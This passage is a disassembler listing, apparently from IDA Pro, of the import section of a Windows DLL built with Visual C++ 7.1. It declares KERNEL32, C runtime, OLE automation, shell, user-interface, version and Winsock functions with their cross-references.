; BOOL __stdcall CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes)
		extrn CreateDirectoryA:dword ; CODE XREF: Ordinal795+B0p
					; DATA XREF: Ordinal795+B0r
; DWORD	__stdcall GetFileAttributesA(LPCSTR lpFileName)
		extrn GetFileAttributesA:dword ; CODE XREF: Ordinal795+97p
					; Ordinal1165+198p
					; DATA XREF: ...
; BOOL __stdcall DuplicateHandle(HANDLE	hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD	dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
		extrn DuplicateHandle:dword ; CODE XREF: Ordinal842+22p
					; DATA XREF: Ordinal842+22r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: Ordinal857+29p
					; Ordinal856+88p ...
; void __stdcall SetLastError(DWORD dwErrCode)
		extrn SetLastError:dword ; CODE	XREF: Ordinal856+125p
					; DATA XREF: Ordinal856+125r
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: Ordinal874+32p
					; sub_6AF5257C+10p
					; DATA XREF: ...
; HANDLE __stdcall GetProcessHeap()
		extrn GetProcessHeap:dword ; CODE XREF:	Ordinal874+2Bp
					; Ordinal871+20p ...
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: Ordinal874+21p
					; DATA XREF: Ordinal874+21r
; SIZE_T __stdcall HeapSize(HANDLE hHeap, DWORD	dwFlags, LPCVOID lpMem)
		extrn HeapSize:dword	; CODE XREF: Ordinal871+4Bp
					; Ordinal873+AFp ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: Ordinal871+23p
					; sub_6AF5256A+9p
					; DATA XREF: ...
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: Ordinal872+51p
					; DATA XREF: Ordinal872+51r
; void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)
		extrn GetSystemInfo:dword ; CODE XREF: Ordinal872+22p
					; Ordinal932+A2p
					; DATA XREF: ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn HeapReAlloc:dword	; CODE XREF: Ordinal873+8Dp
					; sub_6AF52595+1Ap
					; DATA XREF: ...
; HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName, HANDLE	hFile, DWORD dwFlags)
		extrn LoadLibraryExA:dword ; CODE XREF:	Ordinal897+12p
					; DATA XREF: Ordinal897+12r
; HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes)
		extrn LocalAlloc:dword	; CODE XREF: sub_6AF47470+5Bp
					; sub_6AF5215E+161p
					; DATA XREF: ...
; LONG __stdcall InterlockedDecrement(volatile LONG *lpAddend)
		extrn InterlockedDecrement:dword ; CODE	XREF: sub_6AF4777F+8p
					; Ordinal1407+17p ...
; DWORD	__stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
		extrn WaitForSingleObject:dword	; CODE XREF: Ordinal1030+16Ap
					; Ordinal1270+17p ...
; UINT __stdcall SetErrorMode(UINT uMode)
		extrn SetErrorMode:dword ; CODE	XREF: Ordinal1095+8p
					; DATA XREF: Ordinal1095+8r
; BOOL __stdcall CancelIo(HANDLE hFile)
		extrn CancelIo:dword	; CODE XREF: Ordinal1135+15p
					; DATA XREF: Ordinal1135+15r
; UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize)
		extrn GetWindowsDirectoryA:dword ; CODE	XREF: Ordinal1183+Dp
					; Ordinal1184+47p
					; DATA XREF: ...
; DWORD	__stdcall GetLongPathNameA(LPCSTR lpszShortPath, LPSTR lpszLongPath, DWORD cchBuffer)
		extrn GetLongPathNameA:dword ; CODE XREF: Ordinal1165+2A9p
					; Ordinal1165+2FBp
					; DATA XREF: ...
; DWORD	__stdcall GetShortPathNameA(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer)
		extrn GetShortPathNameA:dword ;	CODE XREF: Ordinal1165+1B4p
					; Ordinal1165+1ECp
					; DATA XREF: ...
; DWORD	__stdcall GetTickCount()
		extrn GetTickCount:dword ; CODE	XREF: Ordinal1274:loc_6AF4C4C0p
					; Ordinal1272+Cp ...
; DWORD	__stdcall WaitForMultipleObjectsEx(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable)
		extrn WaitForMultipleObjectsEx:dword ; CODE XREF: Ordinal1270+30p
					; Ordinal1238+2Ep
					; DATA XREF: ...
; BOOL __stdcall TryEnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn TryEnterCriticalSection:dword ; CODE XREF: Ordinal1285+18p
					; DATA XREF: Ordinal1285+18r
; BOOL __stdcall ReleaseSemaphore(HANDLE hSemaphore, LONG lReleaseCount, LPLONG	lpPreviousCount)
		extrn ReleaseSemaphore:dword ; CODE XREF: Ordinal1297+1Fp
					; DATA XREF: Ordinal1297+1Fr
; BOOL __stdcall ReleaseMutex(HANDLE hMutex)
		extrn ReleaseMutex:dword ; CODE	XREF: Ordinal1311+16p
					; DATA XREF: Ordinal1311+16r
; BOOL __stdcall SetEvent(HANDLE hEvent)
		extrn SetEvent:dword	; CODE XREF: Ordinal1322+16p
					; Ordinal1367+18p
					; DATA XREF: ...
; BOOL __stdcall PulseEvent(HANDLE hEvent)
		extrn PulseEvent:dword	; CODE XREF: Ordinal1323+16p
					; DATA XREF: Ordinal1323+16r
; BOOL __stdcall ResetEvent(HANDLE hEvent)
		extrn ResetEvent:dword	; CODE XREF: Ordinal1324+16p
					; DATA XREF: Ordinal1324+16r
; HANDLE __stdcall CreateSemaphoreA(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCSTR	lpName)
		extrn CreateSemaphoreA:dword ; CODE XREF: Ordinal1294+57p
					; DATA XREF: Ordinal1294+57r
; HANDLE __stdcall OpenSemaphoreA(DWORD	dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
		extrn OpenSemaphoreA:dword ; CODE XREF:	Ordinal1295+5Cp
					; DATA XREF: Ordinal1295+5Cr
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName)
		extrn CreateMutexA:dword ; CODE	XREF: Ordinal1306+54p
					; DATA XREF: Ordinal1306+54r
; HANDLE __stdcall OpenMutexA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
		extrn OpenMutexA:dword	; CODE XREF: Ordinal1307+5Cp
					; DATA XREF: Ordinal1307+5Cr
; HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState,	LPCSTR lpName)
		extrn CreateEventA:dword ; CODE	XREF: Ordinal1317+57p
					; DATA XREF: Ordinal1317+57r
; HANDLE __stdcall OpenEventA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
		extrn OpenEventA:dword	; CODE XREF: Ordinal1318+5Cp
					; DATA XREF: Ordinal1318+5Cr
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
		extrn OpenProcess:dword	; CODE XREF: Ordinal1341+29p
					; Ordinal1352+3Dp
					; DATA XREF: ...
; DWORD	__stdcall SuspendThread(HANDLE hThread)
		extrn SuspendThread:dword ; CODE XREF: Ordinal1384+3p
					; DATA XREF: Ordinal1384+3r
; DWORD	__stdcall ResumeThread(HANDLE hThread)
		extrn ResumeThread:dword ; CODE	XREF: Ordinal1385+3p
					; Ordinal1389+13p ...
; BOOL __stdcall SetThreadPriority(HANDLE hThread, int nPriority)
		extrn SetThreadPriority:dword ;	CODE XREF: Ordinal1392+7p
					; DATA XREF: Ordinal1392+7r
; int __stdcall	GetThreadPriority(HANDLE hThread)
		extrn GetThreadPriority:dword ;	CODE XREF: Ordinal1393+3p
					; DATA XREF: Ordinal1393+3r
; void __stdcall ExitThread(DWORD dwExitCode)
		extrn ExitThread:dword	; CODE XREF: StartAddress+Bp
					; DATA XREF: StartAddress+Br
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
		extrn CreateThread:dword ; CODE	XREF: Ordinal1383+9Cp
					; DATA XREF: Ordinal1383+9Cr
; BOOL __stdcall TerminateThread(HANDLE	hThread, DWORD dwExitCode)
		extrn TerminateThread:dword ; CODE XREF: Ordinal1388+66p
					; DATA XREF: Ordinal1388+66r
; LONG __stdcall InterlockedExchangeAdd(volatile LONG *Addend, LONG Value)
		extrn InterlockedExchangeAdd:dword ; CODE XREF:	Ordinal1403+6p
					; Ordinal1413+6p ...
; LONG __stdcall InterlockedIncrement(volatile LONG *lpAddend)
		extrn InterlockedIncrement:dword ; CODE	XREF: Ordinal1407+8p
					; Ordinal1421+10p ...
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; CODE XREF: sub_6AF5254F+14p
					; DATA XREF: sub_6AF5254F+14r
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: _report_failure+2Ap
					; DATA XREF: _report_failure+2Ar
; BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)
		extrn QueryPerformanceCounter:dword ; CODE XREF: ___security_init_cookie+43p
					; DATA XREF: ___security_init_cookie+43r
; void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime)
		extrn GetSystemTimeAsFileTime:dword ; CODE XREF: ___security_init_cookie+1Bp
					; DATA XREF: ___security_init_cookie+1Br

;
; Imports from MSVCP71.dll
;
; public: static bool __cdecl std::ios_base::sync_with_stdio(bool)
		extrn ?sync_with_stdio@ios_base@std@@SA_N_N@Z:dword
					; CODE XREF: Ordinal481+EAp
					; Ordinal480+111p ...
; public: __thiscall std::basic_string<char, struct std::char_traits<char>, class std::allocator<char>>::basic_string<char, struct std::char_traits<char>, class std::allocator<char>>(char const *)
		extrn ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z:dword
					; CODE XREF: sub_6AF31CCD+23p
					; sub_6AF31E92+24p ...
; public: __thiscall std::basic_string<char, struct std::char_traits<char>, class std::allocator<char>>::~basic_string<char, struct std::char_traits<char>, class std::allocator<char>>(void)
		extrn ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ:dword
					; CODE XREF: sub_6AF313A8+1Ep
					; DATA XREF: sub_6AF313A8+1Er ...
; public: __thiscall std::basic_string<char, struct std::char_traits<char>, class std::allocator<char>>::basic_string<char, struct std::char_traits<char>, class std::allocator<char>>(class basic_string<char,	struct std::char_traits<char>, class std::allocator<char>>::basic_string<char, struct std::char_traits<char>, class std::allocator<char>> const	&)
		extrn ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z:dword
					; CODE XREF: sub_6AF3136A+27p
					; sub_6AF31E35+2Dp
					; DATA XREF: ...
; void __cdecl std::_Nomemory(void)
		extrn ?_Nomemory@std@@YAXXZ:dword ; CODE XREF: operator	new(uint)+12p
					; DATA XREF: operator new(uint)+12r

;
; Imports from MSVCR71.dll
;
		extrn __imp__initterm:dword ; DATA XREF: _inittermr
					; .rdata:6AF64A9Co
; __declspec(dllimport)	void __cdecl terminate(void)
		extrn __imp_?terminate@@YAXXZ:dword ; DATA XREF: terminate(void)r
; __declspec(dllimport)	public:	virtual	__thiscall type_info::~type_info(void)
		extrn __imp_??1type_info@@UAE@XZ:dword
					; DATA XREF: type_info::~type_info(void)r
; _onexit_t __cdecl onexit(_onexit_t Func)
		extrn _onexit:dword	; DATA XREF: __onexit+9r
; void *__cdecl	memcpy(void *Dst, const	void *Src, size_t Size)
		extrn __imp_memcpy:dword ; DATA	XREF: memcpyr
		extrn __imp___dllonexit:dword ;	DATA XREF: __dllonexitr
		extrn __imp__callnewh:dword ; DATA XREF: _callnewhr
		extrn _beginthreadex:dword ; CODE XREF:	Ordinal1383+D1p
					; DATA XREF: Ordinal1383+D1r
; int __cdecl mbsnbicmp(const unsigned __int8 *, const unsigned	__int8 *, size_t)
		extrn _mbsnbicmp:dword	; CODE XREF: Ordinal1356+10Cp
					; Ordinal1356+127p
					; DATA XREF: ...
		extrn _endthreadex:dword ; CODE	XREF: Ordinal1059+56p
					; .text:6AF4FC5Bp
					; DATA XREF: ...
		extrn __imp___security_error_handler:dword
					; DATA XREF: __security_error_handlerr
		extrn _set_security_error_handler:dword	; CODE XREF: Ordinal1025+Cp
					; Ordinal1024+Dp ...
; _purecall_handler __cdecl set_purecall_handler(_purecall_handler Handler)
		extrn _set_purecall_handler:dword ; CODE XREF: Ordinal985+Cp
					; Ordinal984+Dp ...
; int (__cdecl *__cdecl	_set_new_handler(int (__cdecl *)(unsigned int)))(unsigned int)
		extrn ?_set_new_handler@@YAP6AHI@ZP6AHI@Z@Z:dword ; CODE XREF: Ordinal909+Cp
					; Ordinal908+Dp
					; DATA XREF: ...
; int __cdecl _set_new_mode(int)
		extrn ?_set_new_mode@@YAHH@Z:dword ; CODE XREF:	Ordinal909+19p
					; Ordinal908+18p
					; DATA XREF: ...
; __declspec(dllimport)	void __cdecl operator delete[](void *)
		extrn __imp_??_V@YAXPAX@Z:dword	; DATA XREF: operator delete[](void *)r
; public: __thiscall exception::exception(char const * const &)
		extrn ??0exception@@QAE@ABQBD@Z:dword ;	CODE XREF: sub_6AF44FFF+8p
					; Ordinal870+67p ...
; __declspec(dllimport)	public:	virtual	char const * __thiscall	exception::what(void)const
		extrn __imp_?what@exception@@UBEPBDXZ:dword
					; DATA XREF: exception::what(void)r
; int __cdecl memcmp(const void	*Buf1, const void *Buf2, size_t	Size)
		extrn __imp_memcmp:dword ; DATA	XREF: memcmpr
; void __cdecl splitpath(const char *FullPath, char *Drive, char *Dir, char *Filename, char *Ext)
		extrn _splitpath:dword	; CODE XREF: Ordinal679+83p
					; Ordinal1165+14Ep ...
		extrn _adjust_fdiv:dword ; DATA	XREF: _CRT_INIT(x,x,x)+19r
; int __cdecl open_osfhandle(__int32, int)
		extrn _open_osfhandle:dword ; CODE XREF: Ordinal480+D7p
					; Ordinal517+56p
					; DATA XREF: ...
; FILE *__cdecl	fdopen(int FileHandle, const char *Format)
		extrn _fdopen:dword	; CODE XREF: Ordinal480+E0p
					; Ordinal517+62p
					; DATA XREF: ...
; FILE iob[]
		extrn _iob:dword	; DATA XREF: Ordinal481+ABr
					; Ordinal481+BDr ...
; int __cdecl vsprintf(char *Dest, const char *Format, va_list Args)
		extrn vsprintf:dword	; CODE XREF: sub_6AF31BAD+30p
					; sub_6AF31BF4+36p
					; DATA XREF: ...
; int __cdecl vscprintf(const char *Format, va_list ArgList)
		extrn _vscprintf:dword	; CODE XREF: sub_6AF31BAD+12p
					; sub_6AF31BF4+1Dp
					; DATA XREF: ...
; int __cdecl mbsicmp(const unsigned __int8 *, const unsigned __int8 *)
		extrn _mbsicmp:dword	; CODE XREF: Ordinal149+A8p
					; Ordinal452+14p ...
; unsigned __int8 *__cdecl mbsinc(const	unsigned __int8	*)
		extrn _mbsinc:dword	; CODE XREF: sub_6AF3213B+1Fp
					; sub_6AF3AF9B+51p ...
; public: __thiscall exception::exception(void)
		extrn ??0exception@@QAE@XZ:dword ; CODE	XREF: sub_6AF3136A+11p
					; DATA XREF: sub_6AF3136A+11r
; public: virtual __thiscall exception::~exception(void)
		extrn ??1exception@@UAE@XZ:dword ; CODE	XREF: sub_6AF313A8+2Ap
					; DATA XREF: sub_6AF313A8+2Ar ...
; __declspec(dllimport)	void __cdecl operator delete(void *)
		extrn __imp_??3@YAXPAX@Z:dword ; DATA XREF: operator delete(void *)r
		extrn __CxxFrameHandler:dword
					; DATA XREF: unknown_libname_19:___CxxFrameHandlerr
; void *__cdecl	memset(void *Dst, int Val, size_t Size)
		extrn __imp_memset:dword ; DATA	XREF: memsetr
; int __cdecl mbscmp(const unsigned __int8 *, const unsigned __int8 *)
		extrn _mbscmp:dword	; CODE XREF: sub_6AF31807+Ep
					; sub_6AF426F5+Bp
					; DATA XREF: ...
		extrn __imp__CxxThrowException:dword ; DATA XREF: _CxxThrowExceptionr
		extrn __imp__except_handler3:dword ; DATA XREF:	_except_handler3r
; void __cdecl free(void *Memory)
		extrn __imp_free:dword	; CODE XREF: _CRT_INIT(x,x,x)+AAp
					; DATA XREF: freer ...
; void *__cdecl	malloc(size_t Size)
		extrn __imp_malloc:dword ; CODE	XREF: _CRT_INIT(x,x,x)+2Ep
					; DATA XREF: mallocr ...
; size_t __cdecl wcslen(const wchar_t *Str)
		extrn wcslen:dword	; CODE XREF: sub_6AF348E7+11p
					; sub_6AF376DF+13p
					; DATA XREF: ...
		extrn __imp__purecall:dword ; DATA XREF: _purecallr
		extrn __imp___CppXcptFilter:dword ; DATA XREF: __CppXcptFilterr
; void *__cdecl	memmove(void *Dst, const void *Src, size_t Size)
		extrn memmove:dword	; CODE XREF: sub_6AF31A5C+44p
					; sub_6AF3343D+Fp ...
; size_t __cdecl strlen(const char *Str)
		extrn __imp_strlen:dword ; DATA	XREF: strlenr
; int sscanf(const char	*Src, const char *Format, ...)
		extrn sscanf:dword	; CODE XREF: Ordinal623+E6p
					; DATA XREF: Ordinal623+E6r
; __declspec(dllimport)	public:	__thiscall exception::exception(class exception	const &)
		extrn __imp_??0exception@@QAE@ABV0@@Z:dword ; CODE XREF: sub_6AF31E35+16p
					; sub_6AF4523C+7p
					; DATA XREF: ...
; int __cdecl fclose(FILE *File)
		extrn fclose:dword	; CODE XREF: Ordinal481+F9p
					; Ordinal511+34p ...
; size_t __cdecl mbscspn(const unsigned	__int8 *, const	unsigned __int8	*)
		extrn _mbscspn:dword	; CODE XREF: sub_6AF3CDE8+5Ap
					; DATA XREF: sub_6AF3CDE8+5Ar
; size_t __cdecl mbsspn(const unsigned __int8 *, const unsigned	__int8 *)
		extrn _mbsspn:dword	; CODE XREF: sub_6AF3CDE8+45p
					; DATA XREF: sub_6AF3CDE8+45r
; unsigned __int8 *__cdecl mbschr(const	unsigned __int8	*, unsigned int)
		extrn _mbschr:dword	; CODE XREF: sub_6AF3B17D+23p
					; sub_6AF3B1DD+1Bp ...
; unsigned __int8 *__cdecl mbsstr(const	unsigned __int8	*, const unsigned __int8 *)
		extrn _mbsstr:dword	; CODE XREF: sub_6AF3B014+6Fp
					; sub_6AF3B014+D6p ...
; char *__cdecl	strcpy(char *Dest, const char *Source)
		extrn __imp_strcpy:dword ; DATA	XREF: strcpyr

;
; Imports from OLEAUT32.dll
;
; SAFEARRAY *__stdcall SafeArrayCreateVector(VARTYPE vt, LONG lLbound, ULONG cElements)
		extrn SafeArrayCreateVector:dword ; CODE XREF: Ordinal1504+20p
					; DATA XREF: Ordinal1504+20r ...
; HRESULT __stdcall SafeArrayAccessData(SAFEARRAY *psa,	void **ppvData)
		extrn SafeArrayAccessData:dword	; CODE XREF: Ordinal1519+2Ep
					; DATA XREF: Ordinal1519+2Er
; HRESULT __stdcall SafeArrayUnaccessData(SAFEARRAY *psa)
		extrn SafeArrayUnaccessData:dword ; CODE XREF: Ordinal1505+1Bp
					; Ordinal1520+22p
					; DATA XREF: ...
; SAFEARRAY *__stdcall SafeArrayCreate(VARTYPE vt, UINT	cDims, SAFEARRAYBOUND *rgsabound)
		extrn SafeArrayCreate:dword ; CODE XREF: Ordinal1475+2Dp
					; DATA XREF: Ordinal1475+2Dr
; HRESULT __stdcall SafeArrayLock(SAFEARRAY *psa)
		extrn SafeArrayLock:dword ; CODE XREF: Ordinal1488+Ap
					; DATA XREF: Ordinal1488+Ar
; HRESULT __stdcall SafeArrayPtrOfIndex(SAFEARRAY *psa,	LONG *rgIndices, void **ppvData)
		extrn SafeArrayPtrOfIndex:dword	; CODE XREF: Ordinal1487+38p
					; DATA XREF: Ordinal1487+38r
; HRESULT __stdcall SafeArrayGetElement(SAFEARRAY *psa,	LONG *rgIndices, void *pv)
		extrn SafeArrayGetElement:dword	; CODE XREF: Ordinal1485+41p
					; DATA XREF: Ordinal1485+41r
; HRESULT __stdcall SafeArrayUnlock(SAFEARRAY *psa)
		extrn SafeArrayUnlock:dword ; CODE XREF: Ordinal1476+1Bp
					; Ordinal1489+Ap
					; DATA XREF: ...
; HRESULT __stdcall SafeArrayRedim(SAFEARRAY *psa, SAFEARRAYBOUND *psaboundNew)
		extrn SafeArrayRedim:dword ; CODE XREF:	Ordinal1495+3Fp
					; DATA XREF: Ordinal1495+3Fr
; void __stdcall SysFreeString(BSTR bstrString)
		extrn SysFreeString:dword ; CODE XREF: sub_6AF47317+Ap
					; DATA XREF: sub_6AF47317+Ar
; BSTR __stdcall SysAllocString(const OLECHAR *psz)
		extrn SysAllocString:dword ; CODE XREF:	sub_6AF472B2+12p
					; DATA XREF: sub_6AF472B2+12r
; BSTR __stdcall SysAllocStringByteLen(LPCSTR psz, UINT	len)
		extrn SysAllocStringByteLen:dword ; CODE XREF: Ordinal379+36p
					; sub_6AF472E6+13p
					; DATA XREF: ...
; UINT __stdcall SysStringByteLen(BSTR bstr)
		extrn SysStringByteLen:dword ; CODE XREF: Ordinal378+12p
					; sub_6AF472E6+Ap
					; DATA XREF: ...
; void __stdcall VariantInit(VARIANTARG	*pvarg)
		extrn VariantInit:dword	; CODE XREF: Ordinal245+31p
					; Ordinal247+31p ...
; HRESULT __stdcall VariantClear(VARIANTARG *pvarg)
		extrn VariantClear:dword ; CODE	XREF: Ordinal250+1Dp
					; Ordinal287+Dp ...
; HRESULT __stdcall VariantCopyInd(VARIANT *pvarDest, const VARIANTARG *pvargSrc)
		extrn VariantCopyInd:dword ; CODE XREF:	Ordinal174+44p
					; Ordinal288+47p ...
; HRESULT __stdcall SafeArrayPutElement(SAFEARRAY *psa,	LONG *rgIndices, void *pv)
		extrn SafeArrayPutElement:dword	; CODE XREF: Ordinal1486+4Ep
					; DATA XREF: Ordinal1486+4Er

;
; Imports from SHELL32.dll
;
; BOOL __stdcall SHGetSpecialFolderPathA(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate)
		extrn SHGetSpecialFolderPathA:dword ; CODE XREF: Ordinal188+47p
					; sub_6AF35645+25p
					; DATA XREF: ...

;
; Imports from SHLWAPI.dll
;
; LPSTR	__stdcall PathAddBackslashA(LPSTR pszPath)
		extrn PathAddBackslashA:dword ;	CODE XREF: Ordinal795+54p
					; DATA XREF: Ordinal795+54r ...
; LSTATUS __stdcall SHDeleteEmptyKeyA(HKEY hkey, LPCSTR	pszSubKey)
		extrn SHDeleteEmptyKeyA:dword ;	CODE XREF: Ordinal996+14p
					; DATA XREF: Ordinal996+14r
; LPSTR	__stdcall PathSkipRootA(LPCSTR pszPath)
		extrn PathSkipRootA:dword ; CODE XREF: Ordinal795+66p
					; DATA XREF: Ordinal795+66r
; BOOL __stdcall StrTrimA(LPSTR	psz, LPCSTR pszTrimChars)
		extrn StrTrimA:dword	; CODE XREF: Ordinal704+53p
					; DATA XREF: Ordinal704+53r
; LPSTR	__stdcall PathRemoveBackslashA(LPSTR pszPath)
		extrn PathRemoveBackslashA:dword ; CODE	XREF: Ordinal183+59p
					; DATA XREF: Ordinal183+59r
; BOOL __stdcall PathIsUNCA(LPCSTR pszPath)
		extrn PathIsUNCA:dword	; CODE XREF: Ordinal795+5Bp
					; DATA XREF: Ordinal795+5Br
; LSTATUS __stdcall SHDeleteKeyA(HKEY hkey, LPCSTR pszSubKey)
		extrn SHDeleteKeyA:dword ; CODE	XREF: Ordinal995+14p
					; DATA XREF: Ordinal995+14r

;
; Imports from USER32.dll
;
; BOOL __stdcall UnregisterClassA(LPCSTR lpClassName, HINSTANCE	hInstance)
		extrn UnregisterClassA:dword ; CODE XREF: Ordinal857+35p
					; DATA XREF: Ordinal857+35r ...
; int wsprintfA(LPSTR, LPCSTR, ...)
		extrn wsprintfA:dword	; CODE XREF: Ordinal148+1BBp
					; sub_6AF325B5+25p ...
; LPSTR	__stdcall CharNextA(LPCSTR lpsz)
		extrn CharNextA:dword	; CODE XREF: Ordinal795+D6p
					; DATA XREF: Ordinal795+D6r
; LONG __stdcall SetWindowLongA(HWND hWnd, int nIndex, LONG dwNewLong)
		extrn SetWindowLongA:dword ; CODE XREF:	Ordinal859+7Cp
					; Ordinal856+131p
					; DATA XREF: ...
; BOOL __stdcall PeekMessageA(LPMSG lpMsg, HWND	hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
		extrn PeekMessageA:dword ; CODE	XREF: Ordinal1272+80p
					; Ordinal1272+D8p
					; DATA XREF: ...
; DWORD	__stdcall MsgWaitForMultipleObjectsEx(DWORD nCount, const HANDLE *pHandles, DWORD dwMilliseconds, DWORD	dwWakeMask, DWORD dwFlags)
		extrn MsgWaitForMultipleObjectsEx:dword	; CODE XREF: Ordinal1272+63p
					; DATA XREF: Ordinal1272+63r
; void __stdcall PostQuitMessage(int nExitCode)
		extrn PostQuitMessage:dword ; CODE XREF: Ordinal1272+E3p
					; DATA XREF: Ordinal1272+E3r
; int __stdcall	GetSystemMetrics(int nIndex)
		extrn GetSystemMetrics:dword ; CODE XREF: Ordinal949+5p
					; DATA XREF: Ordinal949+5r
; BOOL __stdcall GetClassInfoExA(HINSTANCE hInstance, LPCSTR lpszClass,	LPWNDCLASSEXA lpwcx)
		extrn GetClassInfoExA:dword ; CODE XREF: Ordinal856+8Bp
					; Ordinal856+E6p
					; DATA XREF: ...
; ATOM __stdcall RegisterClassExA(const	WNDCLASSEXA *)
		extrn RegisterClassExA:dword ; CODE XREF: Ordinal856+CBp
					; DATA XREF: Ordinal856+CBr
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
		extrn CreateWindowExA:dword ; CODE XREF: Ordinal856+110p
					; DATA XREF: Ordinal856+110r
; LONG __stdcall GetWindowLongA(HWND hWnd, int nIndex)
		extrn GetWindowLongA:dword ; CODE XREF:	sub_6AF44B5C+8p
					; DATA XREF: sub_6AF44B5C+8r
; LRESULT __stdcall DefWindowProcA(HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
		extrn DefWindowProcA:dword ; DATA XREF:	Ordinal859+19r
					; sub_6AF44B5C+13r
; BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
		extrn GetMessageA:dword	; CODE XREF: Ordinal858+38p
					; DATA XREF: Ordinal858+12r
; BOOL __stdcall TranslateMessage(const	MSG *lpMsg)
		extrn TranslateMessage:dword ; CODE XREF: Ordinal858+21p
					; Ordinal1272+A3p
					; DATA XREF: ...
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
		extrn DispatchMessageA:dword ; CODE XREF: Ordinal858+2Bp
					; Ordinal1272+ADp
					; DATA XREF: ...
; BOOL __stdcall DestroyWindow(HWND hWnd)
		extrn DestroyWindow:dword ; CODE XREF: Ordinal857+16p
					; DATA XREF: Ordinal857+16r
; BOOL __stdcall PostMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
		extrn PostMessageA:dword ; CODE	XREF: Ordinal855+11p
					; DATA XREF: Ordinal855+11r
; BOOL __stdcall PostThreadMessageA(DWORD idThread, UINT Msg, WPARAM wParam, LPARAM lParam)
		extrn PostThreadMessageA:dword ; CODE XREF: Ordinal855+25p
					; DATA XREF: Ordinal855+25r
; LPSTR	__stdcall CharPrevA(LPCSTR lpszStart, LPCSTR lpszCurrent)
		extrn CharPrevA:dword	; CODE XREF: Ordinal795+6Ep
					; DATA XREF: Ordinal795+6Er

;
; Imports from VERSION.dll
;
; DWORD	__stdcall GetFileVersionInfoSizeA(LPCSTR lptstrFilename, LPDWORD lpdwHandle)
		extrn __imp_GetFileVersionInfoSizeA:dword
					; DATA XREF: GetFileVersionInfoSizeAr
					; .rdata:6AF64AC4o
; BOOL __stdcall VerQueryValueA(LPCVOID	pBlock,	LPCSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen)
		extrn __imp_VerQueryValueA:dword ; DATA	XREF: VerQueryValueAr
; BOOL __stdcall GetFileVersionInfoA(LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID	lpData)
		extrn __imp_GetFileVersionInfoA:dword ;	DATA XREF: GetFileVersionInfoAr

;
; Imports from WS2_32.dll
;
; int __stdcall	WSAGetLastError()
		extrn WSAGetLastError:dword ; CODE XREF: Ordinal1120+Ap
					; Ordinal1125+17p ...
; int __stdcall	WSACleanup()
		extrn WSACleanup:dword	; CODE XREF: Ordinal1120p
					; DATA XREF: Ordinal1120r
; int __stdcall	bind(SOCKET s, const struct sockaddr *name, int	namelen)
		extrn bind:dword	; CODE XREF: Ordinal1125+Cp
					; DATA XREF: Ordinal1125+Cr
